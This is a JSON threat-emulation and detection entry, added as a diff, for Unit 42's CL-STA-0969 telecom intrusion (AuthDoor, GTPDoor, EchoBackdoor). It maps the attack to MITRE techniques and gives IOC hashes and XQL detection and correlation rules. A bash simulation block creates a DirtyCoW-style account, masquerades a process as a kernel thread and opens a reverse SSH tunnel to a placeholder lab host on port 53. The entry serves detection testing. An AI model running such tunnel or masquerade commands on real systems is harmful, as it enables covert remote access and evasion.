@@ -1,0 +1,550 @@
+{
+  "id": "TTP-2026-0192",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-10-27T00:00:00+00:00",
+    "updated_at": "2026-10-27T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "plane-edr",
+      "plane-ndr",
+      "actor-cl-sta-0969",
+      "malware-gtpdoor",
+      "malware-cordscan",
+      "malware-authdoor",
+      "malware-echobackdoor",
+      "unit42",
+      "stitched-chain",
+      "telecom",
+      "pam-backdoor",
+      "covert-c2",
+      "reverse-ssh-tunnel",
+      "wildfire",
+      "correlation",
+      "severity-high"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 600,
+      "cleanup_required": true,
+      "safety_class": "safe-by-design"
+    }
+  },
+  "identity": {
+    "name": "CL-STA-0969 Telecom Intrusion — AuthDoor PAM Backdoor, GTPDoor / EchoBackdoor Covert C2 and Reverse SSH Tunnels (T1556.003 / T1205 / T1572)",
+    "summary": "Endpoint + NGFW stitched chain for Unit 42's CL-STA-0969 telecom report: SSH dictionary attempts, firefart residue, an AuthDoor pam_unix.so write, a [kpqd] masquerade, a GTP-C 2123 listener, covert ICMP/DNS, a reverse SSH tunnel to port 53 and a wtmp scrub, plus WildFire logs for five toolkit sha256s, joined on src_host by CR-MP-0033.",
+    "description": "CL-STA-0969 targeted telecommunications organisations' roaming and interconnect networks. Entry was most likely SSH brute force with a dictionary of telecom built-in accounts. The actor escalated with public DirtyCoW, PwnKit and sudo exploits (DirtyCoW leaving the temporary user firefart), replaced pam_unix.so with the AuthDoor backdoor (captured credentials in /usr/bin/.dbus.log), ran tools under dbus-* and kernel-thread names kept alive by watchdog scripts, and used covert channels: GTPDoor over GTP-C on UDP 2123, EchoBackdoor over ICMP echo, NoDepDNS over raw DNS, plus reverse SSH tunnels to remote port 53, Microsocks, FRP and Cordscan for SGSN collection. It cleared wtmp with utmpdump and sed, nulled HISTFILE and timestomped with touch -r. The simulation runs each stage with inert stand-ins against lab targets and emits the NGFW WildFire records for five tools with their published hashes.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "CL-STA-0969",
+        "aliases": []
+      }
+    ],
+    "campaigns": [
+      "CL-STA-0969 long-term espionage against telecommunications roaming and interconnect networks (2024-2025)"
+    ],
+    "malware_families": [
+      {
+        "name": "GTPDoor"
+      },
+      {
+        "name": "Cordscan"
+      },
+      {
+        "name": "AuthDoor"
+      },
+      {
+        "name": "EchoBackdoor"
+      },
+      {
+        "name": "NoDepDNS"
+      },
+      {
+        "name": "ChronosRAT"
+      }
+    ],
+    "industries_targeted": [
+      "telecommunications"
+    ],
+    "first_observed": "2024"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1110",
+        "subtechnique_id": "T1110.001",
+        "name": "Brute Force: Password Guessing",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1068",
+        "name": "Exploitation for Privilege Escalation",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1556",
+        "subtechnique_id": "T1556.003",
+        "name": "Modify Authentication Process: Pluggable Authentication Modules",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1036",
+        "subtechnique_id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Name or Location",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1205",
+        "name": "Traffic Signaling",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1095",
+        "name": "Non-Application Layer Protocol",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1572",
+        "name": "Protocol Tunneling",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.004",
+        "name": "Remote Services: SSH",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.002",
+        "name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      }
+    ],
+    "kill_chain_phase": "command-and-control",
+    "data_sources": [
+      "Process: Process Creation",
+      "File: File Creation",
+      "File: File Modification",
+      "User Account: User Account Creation",
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-MP-033 — CL-STA-0969 telecom intrusion stitched chain (AuthDoor, GTPDoor, EchoBackdoor, reverse SSH tunnels)",
+    "privilege_required": "root",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR / XSIAM agent on the Linux endpoint and NGFW traffic + threat-log ingestion into panw_ngfw_traffic_raw / panw_ngfw_threat_raw via an HTTP collector.",
+        "check_command": "systemctl is-active traps_pmd || /opt/traps/bin/cytool runtime query"
+      },
+      {
+        "description": "A lab host on STAGE_HOST stands in for the actor's SSH and ICMP peers; LAB_RESOLVER names the lab resolver for the GTP-node DNS trigger.",
+        "check_command": "echo \"STAGE_HOST=${STAGE_HOST:-127.0.0.1} LAB_RESOLVER=${LAB_RESOLVER:-127.0.0.53}\""
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Inert endpoint stages of SIM-MP-033 (see the scenario for the full per-step commands).\nLAB=/var/tmp/.cortexsim-mp033; mkdir -p \"$LAB/lib/security\" \"$LAB/bin\"\nuseradd -M -s /usr/sbin/nologin firefart && userdel firefart\ncp \"$(find /lib /usr/lib -name pam_unix.so | head -n 1)\" \"$LAB/lib/security/pam_unix.so\"\n( exec -a '[kpqd]' sleep 25 ) &\nping -c 3 -s 14 -p 66756e6e79416e644861707079 \"${STAGE_HOST:-127.0.0.1}\"\ntimeout 8 ssh -o BatchMode=yes -N -R 2222:127.0.0.1:22 -p 53 \"tunnel@${STAGE_HOST:-127.0.0.1}\" || true",
+      "input_variables": [
+        {
+          "name": "STAGE_HOST",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "Lab host standing in for the actor's SSH-tunnel and ICMP peers."
+        },
+        {
+          "name": "LAB_RESOLVER",
+          "type": "string",
+          "default": "127.0.0.53",
+          "description": "Lab resolver the GTP-node DNS trigger query is sent to."
+        }
+      ],
+      "timeout_seconds": 600
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "pam_unix.so copy written outside the package manager.",
+        "expected_value": "/var/tmp/.cortexsim-mp033/lib/security/pam_unix.so"
+      },
+      {
+        "artifact_type": "file",
+        "description": "AuthDoor credential-log path, empty and timestomped.",
+        "expected_value": "/usr/bin/.dbus.log"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "WildFire threat records for five delivered tools in panw_ngfw_threat_raw.",
+        "expected_value": "filedigest in the five published CL-STA-0969 toolkit sha256s"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "pkill -f '^\\[kpqd\\]' || true; pkill -f '^dnsd_el5' || true\nif id firefart >/dev/null 2>&1; then userdel firefart; fi\nrm -f /usr/bin/.dbus.log /tmp/mp-033-threat.yml /tmp/mp-033-ssh.yml\nrm -rf /var/tmp/.cortexsim-mp033"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161",
+        "context": "dnsd_el5 — GTPDoor, GTP-C (UDP 2123) covert backdoor. (Unit 42 IOC table; carried as the filedigest of a WildFire threat-log record)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "bacbe2a793d8ddca0a195b67def527e66d280a13a8d4df90b507546b76e87d29",
+        "context": "dbusquery — Cordscan, SGSN location/IMSI collector. (Unit 42 IOC table; carried as the filedigest of a WildFire threat-log record)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "188861d7f0861103886543eff63a96c314c8262dbf52c6e0cf9372cf1e889d52",
+        "context": "evip-echo | pickup — EchoBackdoor, ICMP echo C2. (Unit 42 IOC table; carried as the filedigest of a WildFire threat-log record)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "432125ca41a2c5957013c8bff09c4037ad18addccab872d46230dd662a2b8123",
+        "context": "/tmp/httpds — ChronosRAT. (Unit 42 IOC table; carried as the filedigest of a WildFire threat-log record)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "9e1f5a134d13167a9148f2d5a1e6a96136d22ecdfbc502aa974544e7efe16a22",
+        "context": "sshtun — sets up SSH tunneling and executes watchdogdd. (Unit 42 IOC table; carried as the filedigest of a WildFire threat-log record)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "540f60702ee5019cd2b39b38b07e17da69bde1f9ed3b4543ff26e9da7ba6e0be",
+        "context": "pam_unix.so — AuthDoor PAM backdoor. (Unit 42 IOC table; carried as a printed hash for tenant search)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "44e83f84a5d5219e2f7c3cf1e4f02489cae81361227f46946abe4b8d8245b879",
+        "context": "pslogs — PwnKit (CVE-2021-4034) exploit. (Unit 42 IOC table; carried as a printed hash for tenant search)",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+        "published": "2025-07-29",
+        "safe_form": "hash_only"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "MP-033 SSH Client Fan-Out Across Default Accounts to One Host",
+        "description": "One causality starts the ssh client against one destination with four or more distinct account names in a short window — dictionary attempts with built-in account names.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter lowercase(action_process_image_name) = \"ssh\"\n| alter target = arrayindex(regextract(action_process_image_command_line, \"([A-Za-z0-9._-]+)@([A-Za-z0-9._:-]+)\"), 0)\n| alter acct = arrayindex(split(target, \"@\"), 0), dest = arrayindex(split(target, \"@\"), 1)\n| filter acct != null\n| comp count_distinct(acct) as accounts, count() as attempts by agent_hostname, causality_actor_process_instance_id, dest\n| filter accounts >= 4",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1110.001"
+        ]
+      },
+      {
+        "name": "MP-033 DirtyCoW firefart Account Created and Removed",
+        "description": "An account named firefart — the fixed username the public DirtyCoW exploit writes — is created or removed, or appears in an /etc/passwd write.",
+        "logic": "dataset = xdr_data\n| filter (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and lowercase(action_process_image_name) in (\"useradd\", \"userdel\", \"adduser\", \"deluser\", \"usermod\") and lowercase(action_process_image_command_line) contains \"firefart\") or (event_type = ENUM.FILE and action_file_path = \"/etc/passwd\" and lowercase(causality_actor_process_command_line) contains \"firefart\")\n| fields _time, agent_hostname, actor_effective_username, action_process_image_name, action_process_image_command_line, causality_actor_process_instance_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1068"
+        ]
+      },
+      {
+        "name": "MP-033 pam_unix.so Written Outside the Package Manager",
+        "description": "A file named pam_unix.so (or pam_unix2.so) is written by a process that is not dpkg/rpm/apt/yum/dnf, optionally with /usr/bin/.dbus.log created in the same causality — AuthDoor PAM replacement and its credential log.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE, ENUM.FILE_RENAME)\n| filter lowercase(action_file_name) in (\"pam_unix.so\", \"pam_unix2.so\", \".dbus.log\")\n| filter lowercase(actor_process_image_name) not in (\"dpkg\", \"rpm\", \"apt\", \"apt-get\", \"yum\", \"dnf\", \"zypper\", \"unattended-upgr\")\n| comp count_distinct(action_file_name) as names, values(action_file_path) as paths by agent_hostname, causality_actor_process_instance_id\n| filter names >= 1",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1556.003"
+        ]
+      },
+      {
+        "name": "MP-033 Kernel-Thread-Named Process Restarted by a Watchdog Script",
+        "description": "A user-space process whose command line begins with a bracketed kernel-thread name is started by a shell rather than kthreadd — the [kpqd] / [watchdog/1] masquerade kept alive by watchdogdd.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line ~= \"^\\[[a-z0-9_/:-]+\\]\"\n| filter lowercase(actor_process_image_name) in (\"bash\", \"sh\", \"dash\", \"zsh\", \"python3\", \"perl\")\n| fields _time, agent_hostname, action_process_image_path, action_process_image_command_line, actor_process_command_line, causality_actor_process_instance_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1036.005"
+        ]
+      },
+      {
+        "name": "MP-033 Fixed-Pattern ICMP Echo and GTP-Node DNS Trigger from One Causality",
+        "description": "ping is run with a small payload size and a fill pattern (-s/-p), and the same causality queries a .node GTP-node name (pgw-s5s8.mpgw001.node) — EchoBackdoor-sized ICMP chunks plus the NoDepDNS trigger question.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| alter is_ping = if(lowercase(action_process_image_name) = \"ping\" and action_process_image_command_line contains \" -p \" and action_process_image_command_line contains \" -s \", 1, 0)\n| alter is_trigger = if(lowercase(action_process_image_command_line) contains \".mpgw\" or lowercase(action_process_image_command_line) ~= \"pgw-[a-z0-9-]+\\.[a-z0-9.-]+\\.node\", 1, 0)\n| comp sum(is_ping) as pings, sum(is_trigger) as triggers by agent_hostname, causality_actor_process_instance_id\n| filter pings >= 1 and triggers >= 1",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1095",
+          "T1071.004"
+        ]
+      },
+      {
+        "name": "MP-033 Reverse SSH Tunnel to Remote Port 53",
+        "description": "ssh is started with -R remote forwarding and -p 53 — a reverse tunnel carried in an SSH session to a DNS port (sshtun / autoreverse / dnsd).",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter lowercase(action_process_image_name) = \"ssh\"\n| filter action_process_image_command_line ~= \"\\s-R\\s*[0-9]\" and action_process_image_command_line ~= \"\\s-p\\s*53(\\s|$)\"\n| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_instance_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1572",
+          "T1021.004"
+        ]
+      },
+      {
+        "name": "MP-033 wtmp Rewritten via utmpdump With History Disabled and Timestomp",
+        "description": "utmpdump -r runs in a causality that also runs touch -r (timestomp) — the login-record scrub and timestamp reset from the report.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| alter is_scrub = if(lowercase(action_process_image_name) = \"utmpdump\" and action_process_image_command_line contains \"-r\", 1, 0)\n| alter is_stomp = if(lowercase(action_process_image_name) = \"touch\" and action_process_image_command_line ~= \"\\s-r\\s\", 1, 0)\n| comp sum(is_scrub) as scrubs, sum(is_stomp) as stomps by agent_hostname, causality_actor_process_instance_id\n| filter scrubs >= 1 and stomps >= 1",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1070.002",
+          "T1070.003",
+          "T1070.006"
+        ]
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "MP-033 GTP-C Port 2123 Listener Opened by a Non-Core Process",
+        "description": "A process outside the host's learned telecom-core baseline binds UDP 2123 (GTP-C) and receives traffic — the GTPDoor listener shape.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_local_port = 2123 and action_network_protocol = ENUM.UDP\n| comp count() as events, values(actor_process_command_line) as cmd by agent_hostname, actor_process_image_name, causality_actor_process_instance_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1205",
+          "T1095"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-host baseline of UDP 2123 listeners (GTP-C core processes only) -> a new image binding the port inside the masquerade causality, anchored on causality_actor_process_instance_id."
+      },
+      {
+        "name": "MP-033 NGFW Rare SSH Session from the Telecom Host",
+        "description": "NGFW EAL behavioural alert: the endpoint (src_host) opens an SSH session to an uncommon external host. Preset destination — the report publishes no domain or IP; the record stitches on src_host.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter app = \"ssh\" and dest_port = 22\n| comp count() as sessions, count_distinct(dst) as dests by src, endpoint_device_name\n| filter sessions >= 1",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1021.004",
+          "T1572"
+        ],
+        "behavioral_profile": "statistical",
+        "causality_anchor": "Learned per-source-host SSH egress baseline -> SSH session to an uncommon external host on the same src_host as the endpoint reverse-tunnel chain."
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "MP-033 CL-STA-0969 Toolkit sha256s Landed in panw_ngfw_threat_raw",
+        "query": "dataset = panw_ngfw_threat_raw\n| filter _time > to_timestamp(current_time() - 3600)\n| filter lowercase(filedigest) in (\"827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161\", \"bacbe2a793d8ddca0a195b67def527e66d280a13a8d4df90b507546b76e87d29\", \"188861d7f0861103886543eff63a96c314c8262dbf52c6e0cf9372cf1e889d52\", \"432125ca41a2c5957013c8bff09c4037ad18addccab872d46230dd662a2b8123\", \"9e1f5a134d13167a9148f2d5a1e6a96136d22ecdfbc502aa974544e7efe16a22\")\n| filter action in (\"alert\", \"allow\")\n| comp count_distinct(filedigest) as hashes by endpoint_device_name, src\n| filter hashes >= 5",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_threat_raw"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "CL-STA-0969 Telecom Intrusion — Endpoint + NGFW on src_host",
+        "rule_id": "CR-MP-0033",
+        "logic": "BIOC(MP-033 DirtyCoW firefart Account Created and Removed) AND BIOC(MP-033 pam_unix.so Written Outside the Package Manager) AND (BIOC(MP-033 Kernel-Thread-Named Process Restarted by a Watchdog Script) OR ABIOC(MP-033 GTP-C Port 2123 Listener Opened by a Non-Core Process)) AND (IOC(file-sha256 dnsd_el5) OR XQL(MP-033 CL-STA-0969 Toolkit sha256s Landed in panw_ngfw_threat_raw)) AND (BIOC(MP-033 Reverse SSH Tunnel to Remote Port 53) OR ABIOC(MP-033 NGFW Rare SSH Session from the Telecom Host)) joined on agent_hostname = endpoint_device_name (src_host) within 3600 seconds -> ONE incident"
+      }
+    ],
+    "analytics_modules": [
+      {
+        "module": "Cortex XSIAM correlation — endpoint + NGFW threat-log stitch on src_host",
+        "validated": false,
+        "note": "Authored, not tenant-verified: CR-MP-0033 has never run against a live tenant."
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "bioc",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-XDR-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter action_file_name in (\"pam_unix.so\", \".dbus.log\") and actor_process_image_name not in (\"dpkg\", \"rpm\") | comp count() by agent_hostname"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "CR-MP-0033"
+        ],
+        "license_required": "enterprise",
+        "evidence_query": "Endpoint escalation, PAM backdoor, masquerade and tunnel alerts and the NGFW WildFire toolkit-hash records for the same src_host stitch into one CR-MP-0033 incident."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-MP-033",
+        "name": "CL-STA-0969 Telecom Host Compromise to Covert C2",
+        "description": "Validate that the endpoint escalation / backdoor / covert-channel chain and the NGFW threat-log evidence of the delivered toolkit for one host become one CL-STA-0969 incident.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-MP-033A",
+            "objective": "Endpoint BIOC/ABIOCs fire on the telecom host and the five toolkit sha256s land in panw_ngfw_threat_raw for the same src_host; CR-MP-0033 raises ONE incident.",
+            "preconditions": [
+              "XDR agent on the Linux endpoint.",
+              "NGFW traffic and threat logs ingested via an HTTP collector."
+            ],
+            "steps": [
+              "Run SIM-MP-033 on the endpoint with STAGE_HOST and LAB_RESOLVER set to lab hosts.",
+              "Wait for the correlation window to converge."
+            ],
+            "success_criteria": [
+              "Endpoint and NGFW alerts share one src_host.",
+              "CR-MP-0033 raises exactly one incident."
+            ],
+            "expected_score_weight": 1.0
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Enforce key-only SSH with lockout on telecom management interfaces and remove or rename vendor built-in accounts.",
+      "Patch DirtyCoW, PwnKit and sudo CVE-2021-3156 on telecom Linux hosts; file-integrity-monitor PAM modules under /lib*/security.",
+      "Restrict GTP-C (UDP 2123) to known core peers, alert on ICMP echoes with non-standard payloads and on SSH to non-22 ports such as 53."
+    ],
+    "detection_engineering": [
+      "Key the PAM BIOC on a pam_unix.so write by a non-package-manager process, not on the AuthDoor hash.",
+      "Correlate endpoint causality with NGFW threat logs on src_host so a WildFire verdict on a delivered tool joins the endpoint incident."
+    ],
+    "response_playbook": "XSOAR-PB-TelecomLinuxBackdoorCovertC2-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — The Covert Operator's Playbook: Infiltration of Global Telecom Networks",
+      "url": "https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK — T1556.003 Modify Authentication Process: Pluggable Authentication Modules",
+      "url": "https://attack.mitre.org/techniques/T1556/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK — T1572 Protocol Tunneling",
+      "url": "https://attack.mitre.org/techniques/T1572/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ]
+}
